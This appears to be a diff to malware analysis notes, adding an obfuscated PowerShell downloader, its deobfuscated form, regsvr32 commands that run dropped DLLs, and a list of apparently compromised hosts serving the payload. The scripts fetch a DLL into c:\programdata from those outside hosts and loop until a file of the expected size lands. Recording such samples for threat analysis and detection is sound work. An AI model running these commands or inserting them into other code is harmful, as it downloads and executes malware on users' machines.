@@ -21,6 +21,27 @@ c:\windows\syswow64\regsvr32.exe  /s c:\programdata\oiphilfj.dll
 
 C:\Windows\SysWOW64\regsvr32.exe /s "C:\Windows\SysWOW64\Ntetq\kmlysgkrktii.hwz"
 
+********************************************
+
+.ps1 blobs:
+
+$ghkid = "$MJXdfshDrfGZses4=\"http://wearsweetbomb.com/wp-content/15zZybP1EXttxDK4JH/bouhttps://1566xueshe.com/wp-includes/z92ZVqHH8/bouhttp://mymicrogreen.mightcode.com/Fox-C/NWssAbNOJDxhs/bouhttp://o2omart.co.in/infructuose/m4mgt2MeU/bouhttp://mtc.joburg.org.za/-/GBGJeFxXWlNbABv2/bouhttp://www.ama.cu/jpr/VVP/bouhttp://actividades.laforetlanguages.com/wp-admin/dU8Ds/bouhttps://dwwmaster.com/wp-content/1sR2HfFxQnkWuu/bouhttps://edu-media.cn/wp-admin/0JAE/bouhttps://iacademygroup.cl/office/G42LJPLkl/bouhttps://znzhou.top/mode/0Qb/\" -sPLIt \"bou\"; foReACh($yIdsRhye34syufgxjcdf iN $MJXdfshDrfGZses4){$GweYH57sedswd=(\"ciuwd:iuwd\\priuwdogiuwdramiuwddatiuwda\\oiphilfj.diuwdliuwdl\").rePlACe(\"iuwd\",\"\");inVOke-weBrEqUesT -uRI $yIdsRhye34syufgxjcdf -oUtFIle $GweYH57sedswd;iF(teSt-pATh $GweYH57sedswd){if((gEt-itEm $GweYH57sedswd).leNGth -ge 47523){bReak;}}}"
+invoke-expression "$MJXdfshDrfGZses4=\"http://wearsweetbomb.com/wp-content/15zZybP1EXttxDK4JH/bouhttps://1566xueshe.com/wp-includes/z92ZVqHH8/bouhttp://mymicrogreen.mightcode.com/Fox-C/NWssAbNOJDxhs/bouhttp://o2omart.co.in/infructuose/m4mgt2MeU/bouhttp://mtc.joburg.org.za/-/GBGJeFxXWlNbABv2/bouhttp://www.ama.cu/jpr/VVP/bouhttp://actividades.laforetlanguages.com/wp-admin/dU8Ds/bouhttps://dwwmaster.com/wp-content/1sR2HfFxQnkWuu/bouhttps://edu-media.cn/wp-admin/0JAE/bouhttps://iacademygroup.cl/office/G42LJPLkl/bouhttps://znzhou.top/mode/0Qb/\" -sPLIt \"bou\"; foReACh($yIdsRhye34syufgxjcdf iN $MJXdfshDrfGZses4){$GweYH57sedswd=(\"ciuwd:iuwd\\priuwdogiuwdramiuwddatiuwda\\oiphilfj.diuwdliuwdl\").rePlACe(\"iuwd\",\"\");inVOke-weBrEqUesT -uRI $yIdsRhye34syufgxjcdf -oUtFIle $GweYH57sedswd;iF(teSt-pATh $GweYH57sedswd){if((gEt-itEm $GweYH57sedswd).leNGth -ge 47523){bReak;}}}"
+
+----
+
+$mjxdfshdrfgzses4 = "http://wearsweetbomb.com/wp-content/15zZybP1EXttxDK4JH/", "https://1566xueshe.com/wp-includes/z92ZVqHH8/", "http://mymicrogreen.mightcode.com/Fox-C/NWssAbNOJDxhs/", "http://o2omart.co.in/infructuose/m4mgt2MeU/", "http://mtc.joburg.org.za/-/GBGJeFxXWlNbABv2/", "http://www.ama.cu/jpr/VVP/", "http://actividades.laforetlanguages.com/wp-admin/dU8Ds/", "https://dwwmaster.com/wp-content/1sR2HfFxQnkWuu/", "https://edu-media.cn/wp-admin/0JAE/", "https://iacademygroup.cl/office/G42LJPLkl/", "https://znzhou.top/mode/0Qb/"
+foreach ($yidsrhye34syufgxjcdf in $mjxdfshdrfgzses4) {
+  $gweyh57sedswd = "c:\\programdata\\oiphilfj.dll"
+  invoke-webrequest -uri $yidsrhye34syufgxjcdf -outfile $gweyh57sedswd
+  if (test-path "c:\\programdata\\oiphilfj.dll") {
+    if ((get-item "c:\\programdata\\oiphilfj.dll").length -ge 47523) {
+      break
+    }
+  }
+}
+
+
 .dll drops
 
 http://wearsweetbomb.com/wp-content/15zZybP1EXttxDK4JH/
